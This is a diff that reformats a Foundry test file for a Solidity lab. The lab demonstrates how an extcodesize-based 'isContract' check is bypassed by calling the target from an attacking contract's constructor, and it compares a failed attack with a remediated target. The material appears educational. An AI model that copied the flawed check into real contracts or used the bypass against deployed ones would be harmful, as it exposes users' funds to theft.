@@ -4,46 +4,53 @@ pragma solidity ^0.8.15;
 import "forge-std/Test.sol";
 
 contract ContractTest is Test {
-        Target TargetContract;
-        FailedAttack FailedAttackContract;
-        Attack AttackerContract;
-        TargetRemediated TargetRemediatedContract;
+    Target TargetContract;
+    FailedAttack FailedAttackContract;
+    Attack AttackerContract;
+    TargetRemediated TargetRemediatedContract;
 
-         constructor() {
-    TargetContract = new Target();
-    FailedAttackContract = new FailedAttack();
-    TargetRemediatedContract = new TargetRemediated();
-         }
-
-
-function testBypassFailedContractCheck() public {
-    
-    console.log("Before exploiting, protected status of TargetContract:",TargetContract.pwned());
-    console.log("Exploit Failed");
-    FailedAttackContract.pwn(address(TargetContract));
-
-    }
-   
-function testBypassContractCheck() public {
-
-
-    console.log("Before exploiting, protected status of TargetContract:",TargetContract.pwned());
-    AttackerContract = new Attack(address(TargetContract));
-    console.log("After exploiting, protected status of TargetContract:",TargetContract.pwned());
-    console.log("Exploit completed");
-
+    constructor() {
+        TargetContract = new Target();
+        FailedAttackContract = new FailedAttack();
+        TargetRemediatedContract = new TargetRemediated();
     }
 
-
-function testTargetRemediatedContract() public {
-
-    console.log("Before exploiting, protected status of TargetContract:",TargetRemediatedContract.pwned());
-    AttackerContract = new Attack(address(TargetRemediatedContract));
-    console.log("After exploiting, protected status of TargetContract:",TargetRemediatedContract.pwned());
-    console.log("Exploit completed");
-
+    function testBypassFailedContractCheck() public {
+        console.log(
+            "Before exploiting, protected status of TargetContract:",
+            TargetContract.pwned()
+        );
+        console.log("Exploit Failed");
+        FailedAttackContract.pwn(address(TargetContract));
     }
-  receive() payable external{}
+
+    function testBypassContractCheck() public {
+        console.log(
+            "Before exploiting, protected status of TargetContract:",
+            TargetContract.pwned()
+        );
+        AttackerContract = new Attack(address(TargetContract));
+        console.log(
+            "After exploiting, protected status of TargetContract:",
+            TargetContract.pwned()
+        );
+        console.log("Exploit completed");
+    }
+
+    function testTargetRemediatedContract() public {
+        console.log(
+            "Before exploiting, protected status of TargetContract:",
+            TargetRemediatedContract.pwned()
+        );
+        AttackerContract = new Attack(address(TargetRemediatedContract));
+        console.log(
+            "After exploiting, protected status of TargetContract:",
+            TargetRemediatedContract.pwned()
+        );
+        console.log("Exploit completed");
+    }
+
+    receive() external payable {}
 }
 
 contract Target {
@@ -51,7 +58,7 @@ contract Target {
         // This method relies on extcodesize, which returns 0 for contracts in
         // construction, since the code is only stored at the end of the
         // constructor execution.
-        uint size;
+        uint256 size;
         assembly {
             size := extcodesize(account)
         }
@@ -88,7 +95,6 @@ contract Attack {
         Target(_target).protected();
     }
 }
-
 
 contract TargetRemediated {
     function isContract(address account) public view returns (bool) {
